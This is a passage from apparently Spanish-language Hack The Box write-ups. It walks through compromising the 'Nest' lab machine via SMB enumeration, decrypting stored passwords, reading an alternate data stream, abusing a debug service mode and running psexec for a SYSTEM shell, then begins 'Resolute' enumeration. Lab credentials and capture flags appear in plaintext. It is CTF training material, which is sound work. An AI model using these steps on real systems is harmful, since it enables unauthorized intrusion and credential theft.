\\IT\\* smb: \\IT\\\u0026gt; cd .. smb: \\\u0026gt; cd Production dsmb: \\Production\\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\Production\\* smb: \\Production\\\u0026gt; cd .. smb: \\\u0026gt; cd Reports smb: \\Reports\\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\Reports\\* smb: \\Reports\\\u0026gt; cd .. smb: \\\u0026gt; cd Shared dsmb: \\Shared\\\u0026gt; dir . D 0 Wed Aug 7 13:07:51 2019 .. D 0 Wed Aug 7 13:07:51 2019 Maintenance D 0 Wed Aug 7 13:07:32 2019 Templates D 0 Wed Aug 7 13:08:07 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\\u0026gt; cd Maintenance smb: \\Shared\\Maintenance\\\u0026gt; dir . D 0 Wed Aug 7 13:07:32 2019 .. D 0 Wed Aug 7 13:07:32 2019 Maintenance Alerts.txt A 48 Mon Aug 5 17:01:44 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Maintenance\\\u0026gt; get \u0026#34;Maintenance Alerts.txt\u0026#34; getting file \\Shared\\Maintenance\\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\Shared\\Maintenance\\\u0026gt; cd ..\\Templates smb: \\Shared\\Templates\\\u0026gt; dir . D 0 Wed Aug 7 13:08:07 2019 .. D 0 Wed Aug 7 13:08:07 2019 HR D 0 Wed Aug 7 13:08:01 2019 Marketing D 0 Wed Aug 7 13:08:06 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\\u0026gt; dir HR HR D 0 Wed Aug 7 13:08:01 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\\u0026gt; cd HR smb: \\Shared\\Templates\\HR\\\u0026gt; dir . D 0 Wed Aug 7 13:08:01 2019 .. D 0 Wed Aug 7 13:08:01 2019 Welcome Email.txt A 425 Wed Aug 7 16:55:36 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\HR\\\u0026gt; get \u0026#39;Welcome Email.txt\u0026#39; NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\Shared\\Templates\\HR\\\u0026#39;Welcome smb: \\Shared\\Templates\\HR\\\u0026gt; get \u0026#34;Welcome Email.txt\u0026#34; getting file \\Shared\\Templates\\HR\\Welcome Email.txt of size 425 as Welcome Email.txt (0.6 KiloBytes/sec) (average 0.1 KiloBytes/sec) smb: \\Shared\\Templates\\HR\\\u0026gt; cd ..\\Marketing smb: \\Shared\\Templates\\Marketing\\\u0026gt; dir . D 0 Wed Aug 7 13:08:06 2019 .. D 0 Wed Aug 7 13:08:06 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\Shared\\Templates\\Marketing\\\u0026gt;   Los archivos que encontramos son archivos de texto que contienen notas, en una de ellas encontramos las credenciales de uno de los usuarios de la maquina.\nMaintenance Alerts.txt:\nThere is currently no scheduled maintenance work Welcome Email.txt:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  We would like to extend a warm welcome to our newest member of staff, \u0026lt;FIRSTNAME\u0026gt; \u0026lt;SURNAME\u0026gt; You will find your home folder in the following location: \\\\HTB-NEST\\Users\\\u0026lt;USERNAME\u0026gt; If you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you. Username: TempUser Password: welcome2019 Thank you HR   USER - C.Smith Utilizamos las credenciales para enumerar los SHARENAME que estan disponibles en la maquina, en un directorio encontramos un archivo XML RU_config.xml el cual contiene credenciales especificamente de C.Smith.\n1 2 3 4 5 6 7 8 9 10  \\\\\\\\10.10.10.178\\\\Data smb: \\IT\\Configs\\\u0026gt; cd \u0026#34;RU Scanner\u0026#34; smb: \\IT\\Configs\\RU Scanner\\\u0026gt; dir . D 0 Wed Aug 7 14:01:13 2019 .. D 0 Wed Aug 7 14:01:13 2019 RU_config.xml A 270 Thu Aug 8 13:49:37 2019 10485247 blocks of size 4096. 6449668 blocks available smb: \\IT\\Configs\\RU Scanner\\\u0026gt; get RU_config.xml getting file \\IT\\Configs\\RU Scanner\\RU_config.xml of size 270 as RU_config.xml (0.2 KiloBytes/sec) (average 3.4 KiloBytes/sec)   RU_config.xml:\n1 2 3 4 5 6  \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ConfigFile xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;389\u0026lt;/Port\u0026gt; \u0026lt;Username\u0026gt;c.smith\u0026lt;/Username\u0026gt; \u0026lt;Password\u0026gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026lt;/Password\u0026gt; \u0026lt;/ConfigFile\u0026gt;   Tambien encontramos un proyecto que lleva el nombre de RU, para encontrar el directorio de Carl, enumeramos el SHARENAME Data en el cual encontramos un archivo xml en donde se describe un \u0026ldquo;archivo temporal\u0026rdquo; en \\Secure$\\IT\\Carl\\Temp.txt el cual no existe.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  smb: \\IT\\Configs\\NotepadPlusPlus\\\u0026gt; dir . D 0 Wed Aug 7 13:31:37 2019 .. D 0 Wed Aug 7 13:31:37 2019 config.xml A 6451 Wed Aug 7 17:01:25 2019 shortcuts.xml A 2108 Wed Aug 7 13:30:27 2019 10485247 blocks of size 4096. 6449680 blocks available smb: \\IT\\Configs\\NotepadPlusPlus\\\u0026gt; get config.xml getting file \\IT\\Configs\\NotepadPlusPlus\\config.xml of size 6451 as config.xml (7.7 KiloBytes/sec) (average 7.7 KiloBytes/sec) smb: \\IT\\Configs\\NotepadPlusPlus\\\u0026gt; exit root@aoiri:~/htb/nest# tail config.xml \u0026lt;Find name=\u0026#34;redeem on\u0026#34; /\u0026gt; \u0026lt;Find name=\u0026#34;192\u0026#34; /\u0026gt; \u0026lt;Replace name=\u0026#34;C_addEvent\u0026#34; /\u0026gt; \u0026lt;/FindHistory\u0026gt; \u0026lt;History nbMaxFile=\u0026#34;15\u0026#34; inSubMenu=\u0026#34;no\u0026#34; customLength=\u0026#34;-1\u0026#34;\u0026gt; \u0026lt;File filename=\u0026#34;C:\\windows\\System32\\drivers\\etc\\hosts\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\u0026#34; /\u0026gt; \u0026lt;File filename=\u0026#34;C:\\Users\\C.Smith\\Desktop\\todo.txt\u0026#34; /\u0026gt; \u0026lt;/History\u0026gt; \u0026lt;/NotepadPlus\u0026gt; root@aoiri:~/htb/nest#   Dicho Directorio nos llevo a encontrar el Proyecto RU.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; dir . D 0 Tue Aug 6 08:47:41 2019 .. D 0 Tue Aug 6 08:47:41 2019 RU D 0 Fri Aug 9 09:36:45 2019 10485247 blocks of size 4096. 6449639 blocks available smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; mask \u0026#34;\u0026#34; smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; recurse ON smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; prompt OFF smb: \\IT\\Carl\\VB Projects\\WIP\\\u0026gt; mget * getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\ConfigFile.vb of size 772 as ConfigFile.vb (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\Module1.vb of size 279 as Module1.vb (0.8 KiloBytes/sec) (average 1.5 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Application.Designer.vb of size 441 as Application.Designer.vb (1.2 KiloBytes/sec) (average 1.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Application.myapp of size 481 as Application.myapp (1.5 KiloBytes/sec) (average 1.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\AssemblyInfo.vb of size 1163 as AssemblyInfo.vb (1.9 KiloBytes/sec) (average 1.6 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Resources.Designer.vb of size 2776 as Resources.Designer.vb (7.8 KiloBytes/sec) (average 2.5 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Resources.resx of size 5612 as Resources.resx (9.3 KiloBytes/sec) (average 3.9 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Settings.Designer.vb of size 2989 as Settings.Designer.vb (8.6 KiloBytes/sec) (average 4.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\My Project\\Settings.settings of size 279 as Settings.settings (0.8 KiloBytes/sec) (average 4.1 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\RU Scanner.vbproj of size 4828 as RU Scanner.vbproj (13.3 KiloBytes/sec) (average 4.9 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\RU Scanner.vbproj.user of size 143 as RU Scanner.vbproj.user (0.3 KiloBytes/sec) (average 4.4 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\SsoIntegration.vb of size 133 as SsoIntegration.vb (0.4 KiloBytes/sec) (average 4.1 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner\\Utils.vb of size 4888 as Utils.vb (7.5 KiloBytes/sec) (average 4.5 KiloBytes/sec) getting file \\IT\\Carl\\VB Projects\\WIP\\RU\\RUScanner.sln of size 871 as RUScanner.sln (2.3 KiloBytes/sec) (average 4.4 KiloBytes/sec)   Descargamos el proyecto, analizamos el codigo y vemos que es un proyecto que encripta una contraseña o una string desde un archivo de XML y tambien lo desencripta. Modificamos y ejecutamos el proyecto con el archivo RU_config.xml para obtener la contraseña de C.Smith.\nFuncion DecryptString:\n1 2  Console.WriteLine(\u0026#34;Decrypted Text: \u0026#34; +Decrypt(EncryptedString, \u0026#34;N3st22\u0026#34;, \u0026#34;88552299\u0026#34;, 2, \u0026#34;464R5DFA5DL6LE28\u0026#34;, 256)) Threading.Thread.Sleep(50000)   Credenciales:\nC.Smit:xRxRxPANCAK3SxRxRx Utilizamos la contraseña en SAMBA (Users) y logramos leer nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  root@aoiri:~/htb/nest/tmp# smbclient \\\\\\\\10.10.10.178\\\\Users -U C.Smith Enter WORKGROUP\\C.Smith\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Sat Jan 25 17:04:21 2020 .. D 0 Sat Jan 25 17:04:21 2020 Administrator D 0 Fri Aug 9 09:08:23 2019 C.Smith D 0 Sun Jan 26 01:21:44 2020 L.Frost D 0 Thu Aug 8 11:03:01 2019 R.Thompson D 0 Thu Aug 8 11:02:50 2019 TempUser D 0 Wed Aug 7 16:55:56 2019 10485247 blocks of size 4096. 6449275 blocks available smb: \\\u0026gt; cd C.Smith smb: \\C.Smith\\\u0026gt; dir . D 0 Sun Jan 26 01:21:44 2020 .. D 0 Sun Jan 26 01:21:44 2020 HQK Reporting D 0 Thu Aug 8 17:06:17 2019 user.txt A 32 Thu Aug 8 17:05:24 2019 10485247 blocks of size 4096. 6449275 blocks available smb: \\C.Smith\\\u0026gt; get user.txt getting file \\C.Smith\\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\C.Smith\\\u0026gt; exit root@aoiri:~/htb/nest/tmp# cat user.txt cf71b25404be5d84fd827e05f426e987 root@aoiri:~/htb/nest/tmp#   PRIVILEGE ESCALATION Dentro de la carpeta principal de C.Smith encontramos dos archivos el primero parecia estar vacio Debug Mode Password.txt y el segundo HqkLdap.exe un ejecutable. Al obtener más informacion de este archivo encontramos que tiene Alternative Data Streams como en la maquina Dropzone de HackTheBox, obtenemos el archivo y encontramos lo que parece ser una contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  root@aoiri:~/htb# smbclient \\\\\\\\10.10.10.178\\\\Users -U C.Smith #xRxRxPANCAK3SxRxRx Enter WORKGROUP\\C.Smith\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Sat Jan 25 17:04:21 2020 .. D 0 Sat Jan 25 17:04:21 2020 Administrator D 0 Fri Aug 9 09:08:23 2019 C.Smith D 0 Sun Jan 26 01:21:44 2020 L.Frost D 0 Thu Aug 8 11:03:01 2019 R.Thompson D 0 Thu Aug 8 11:02:50 2019 TempUser D 0 Wed Aug 7 16:55:56 2019 10485247 blocks of size 4096. 6449700 blocks available smb: \\\u0026gt; cd \u0026#34;C.Smith\\HQK Reporting\\\u0026#34; smb: \\C.Smith\\HQK Reporting\\\u0026gt; dir . D 0 Thu Aug 8 17:06:17 2019 .. D 0 Thu Aug 8 17:06:17 2019 AD Integration Module D 0 Fri Aug 9 06:18:42 2019 Debug Mode Password.txt A 0 Thu Aug 8 17:08:17 2019 HQK_Config_Backup.xml A 249 Thu Aug 8 17:09:05 2019 10485247 blocks of size 4096. 6449700 blocks available smb: \\C.Smith\\HQK Reporting\\\u0026gt; allinfo \u0026#34;Debug Mode Password.txt\u0026#34; altname: DEBUGM~1.TXT create_time: Thu Aug 8 05:06:12 PM 2019 CST access_time: Thu Aug 8 05:06:12 PM 2019 CST write_time: Thu Aug 8 05:08:17 PM 2019 CST change_time: Thu Aug 8 05:08:17 PM 2019 CST attributes: A (20) stream: [::$DATA], 0 bytes stream: [:Password:$DATA], 15 bytes smb: \\C.Smith\\HQK Reporting\\\u0026gt; get \u0026#34;Debug Mode Password.txt:Password:$DATA\u0026#34; getting file \\C.Smith\\HQK Reporting\\Debug Mode Password.txt:Password:$DATAof size 15 as Debug Mode Password.txt:Password:$DATA(0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\C.Smith\\HQK Reporting\\\u0026gt; exit root@aoiri:~/htb# cat Debug\\ Mode\\ Password.txt\\:Password\\:\\$DATA WBQ201953D8w root@aoiri:~/htb#   Data Streams - SAMBA\nHQK Reporting Service V1.2 - Puerto 4386 En el segundo puerto utilizamos telnet para conectarnos, y por lo que parece es un servicio en el cual podemos ejecutar ciertos comandos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@aoiri:~/htb/nest# rlwrap telnet 10.10.10.178 4386 Trying 10.10.10.178... Connected to 10.10.10.178. Escape character is \u0026#39;^]\u0026#39;. HQK Reporting Service V1.2 \u0026gt;HELP This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR \u0026lt;Directory_Name\u0026gt; RUNQUERY \u0026lt;Query_ID\u0026gt; DEBUG \u0026lt;Password\u0026gt; HELP \u0026lt;Command\u0026gt; \u0026gt;   Enumeramos los querys que existen en el servicio y por lo que parece el servicio utiliza carpetas como directorio y ejecuta los querys (archivos) que existen el directorio, por lo que nos podemos mover a traves de C:\\ como si fuera una consola pero con distintos comandos.\nUno de los comandos interesante es el DEBUG ya que al utilizar este comando junto con la contraseña, tenemos nuevos comandos los cuales podemos ejecutar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  \u0026gt;DEBUG WBQ201953D8w Debug mode enabled. Use the HELP command to view additional commands that are now available \u0026gt;HELP This service allows users to run queries against databases using the legacy HQK format --- AVAILABLE COMMANDS --- LIST SETDIR \u0026lt;Directory_Name\u0026gt; RUNQUERY \u0026lt;Query_ID\u0026gt; DEBUG \u0026lt;Password\u0026gt; HELP \u0026lt;Command\u0026gt; SERVICE SESSION SHOWQUERY \u0026lt;Query_ID\u0026gt; \u0026gt;SETDIR .. Current directory set to HQK \u0026gt;LIST Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [DIR] ALL QUERIES [DIR] LDAP [DIR] Logs [1] HqkSvc.exe [2] HqkSvc.InstallState [3] HQK_Config.xml Current Directory: HQK \u0026gt;SHOWQUERY 3 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;ServiceSettings xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;Port\u0026gt;4386\u0026lt;/Port\u0026gt; \u0026lt;DebugPassword\u0026gt;WBQ201953D8w\u0026lt;/DebugPassword\u0026gt; \u0026lt;QueryDirectory\u0026gt;C:\\Program Files\\HQK\\ALL QUERIES\u0026lt;/QueryDirectory\u0026gt; \u0026lt;/ServiceSettings\u0026gt; \u0026gt;   Dentro de los directorios encontramos la contraseña del usuario Administrator.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  Current Directory: HQK \u0026gt;SETDIR LDAP Current directory set to LDAP \u0026gt;LIST Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY [1] HqkLdap.exe [2] Ldap.conf Current Directory: LDAP \u0026gt;SHOWQUERY 2 Domain=nest.local Port=389 BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local User=Administrator Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4= \u0026gt;   DNSPY - HqkLdap.exe Utilizamos DNSPY para desensamblar el archivo ejecutable que encontramos, al analizar el codigo vemos que utiliza la misma encriptacion que el proyecto \u0026lsquo;RU Scanner\u0026rsquo; con los mismos parametros.\nUtilizamos el projecto \u0026lsquo;RU Scanner\u0026rsquo; con los parametros de encriptacion pasando la contraseña de administrador.\n1 2  Console.Write(\u0026#34;Decrypted: \u0026#34;+Decrypt(\u0026#34;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=\u0026#34;, \u0026#34;667912\u0026#34;, \u0026#34;1313Rf99\u0026#34;, 3, \u0026#34;1L1SA61493DRV53Z\u0026#34;, 256)) Threading.Thread.Sleep(50000)   VB:\nCredenciales:\nAdministrator:XtH4nkS4Pl4y1nGX PSEXEC Utilizamos psexec.py de impacket para obtener nuestra shell y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@aoiri:~/htb/nest# /root/tools/impacket/examples/psexec.py \u0026#39;Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178\u0026#39; Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on 10.10.10.178..... [*] Found writable share ADMIN$ [*] Uploading file GHkDSZLH.exe [*] Opening SVCManager on 10.10.10.178..... [*] Creating service QTBl on 10.10.10.178..... [*] Starting service QTBl..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt 6594c2e[ ... ]94b878c41 C:\\Windows\\system32\u0026gt;   ","description":"","id":23,"section":"posts","tags":["windows"],"title":"Hack The Box - Nest","uri":"https://sckull.github.io/posts/nest/"},{"content":"Resolute es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Resolute     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.169   Maker egre55    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  masscan -p1-65535,U:1-65535 10.10.10.169 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-03 21:06:25 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 3269/tcp on 10.10.10.169 Discovered open port 5985/tcp on 10.10.10.169 Discovered open port 464/tcp on 10.10.10.169 Discovered open port 65511/udp on 10.10.10.169 Discovered open port 593/tcp on 10.10.10.169 Discovered open port 49665/tcp on 10.10.10.169 Discovered open port 3268/tcp on 10.10.10.169 Discovered open port 49915/tcp on 10.10.10.169 Discovered open port 389/tcp on 10.10.10.169 Discovered open port 88/tcp on 10.10.10.169 Discovered open port 49667/tcp on 10.10.10.169 Discovered open port 56647/udp on 10.10.10.169 Discovered open port 53/tcp on 10.10.10.169 # Nmap 7.80 scan initiated Fri Jan 3 15:11:12 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.169 Warning: 10.10.10.169 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.169 Host is up (0.14s latency). Not shown: 63791 closed ports, 1719 filtered ports PORT STATE SERVICE VERSION 53/tcp open tcpwrapped 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-01-03 21:24:08Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found 9389/tcp open adws? 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open unknown 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49688/tcp open msrpc Microsoft Windows RPC 49915/tcp open msrpc Microsoft Windows RPC 52015/tcp open tcpwrapped 52105/tcp open tcpwrapped Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h48m08s, deviation: 4h37m09s, median: 8m07s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Resolute | NetBIOS computer name: RESOLUTE\\x00 | Domain name: megabank.local | Forest name: megabank.local | FQDN: Resolute.megabank.local |_ System time: 2020-01-03T13:25:11-08:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-01-03T21:25:14 |_ start_date: 2020-01-03T20:29:32 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 3 15:18:57 2020 -- 1 IP address (1 host up) scanned in 464.61 seconds   ENUM4LINUX Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271  ========================== | Target Information | ========================== Target ........... 10.10.10.169 RID Range ........ 500-550,1000-1050 Username ......... \u0026#39;\u0026#39; Password ......... \u0026#39;\u0026#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.10.169 | ==================================================== [E] Can\u0026#39;t find workgroup/domain ============================================ | Nbtstat Information for 10.10.10.169 | ============================================ Looking up status of 10.10.10.169 No reply from 10.10.10.169 ===================================== | Session Check on 10.10.10.169 | ===================================== [+] Server 10.10.10.169 allows sessions using username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; [+] Got domain/workgroup name: =========================================== | Getting domain SID for 10.10.10.169 | =========================================== Domain Name: MEGABANK Domain Sid: S-1-5-21-1392959593-3013219662-3596683436 [+] Host is part of a domain (not a workgroup) ====================================== | OS information on 10.10.10.169 | ====================================== [+] Got OS info for 10.10.10.169 from smbclient: [+] Got OS info for 10.10.10.169 from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================= | Users on 10.10.10.169 | ============================= index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail\tName: (null)\tDesc: (null) index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator\tName: (null)\tDesc: Built-in account for administering the computer/domain index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela\tName: (null)\tDesc: (null) index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette\tName: (null)\tDesc: (null) index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika\tName: (null)\tDesc: (null) index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire\tName: (null)\tDesc: (null) index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude\tName: (null)\tDesc: (null) index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount\tName: (null)\tDesc: A user account managed by the system. index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia\tName: (null)\tDesc: (null) index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred\tName: (null)\tDesc: (null) index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domain index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo\tName: (null)\tDesc: (null) index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt\tName: (null)\tDesc: Key Distribution Center Service Account index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus\tName: (null)\tDesc: (null) index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko\tName: Marko Novak\tDesc: Account created. Password set to Welcome123! index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie\tName: (null)\tDesc: (null) index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki\tName: (null)\tDesc: (null) index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo\tName: (null)\tDesc: (null) index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per\tName: (null)\tDesc: (null) index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan\tName: Ryan Bertrand\tDesc: (null) index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally\tName: (null)\tDesc: (null) index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon\tName: (null)\tDesc: (null) index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve\tName: (null)\tDesc: (null) index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie\tName: (null)\tDesc: (null) index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita\tName: (null)\tDesc: (null) index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf\tName: (null)\tDesc: (null) index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach\tName: (null)\tDesc: (null) user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[ryan] rid:[0x451] user:[marko] rid:[0x457] user:[sunita] rid:[0x19c9] user:[abigail] rid:[0x19ca] user:[marcus] rid:[0x19cb] user:[sally] rid:[0x19cc] user:[fred] rid:[0x19cd] user:[angela] rid:[0x19ce] user:[felicia] rid:[0x19cf] user:[gustavo] rid:[0x19d0] user:[ulf] rid:[0x19d1] user:[stevie] rid:[0x19d2] user:[claire] rid:[0x19d3] 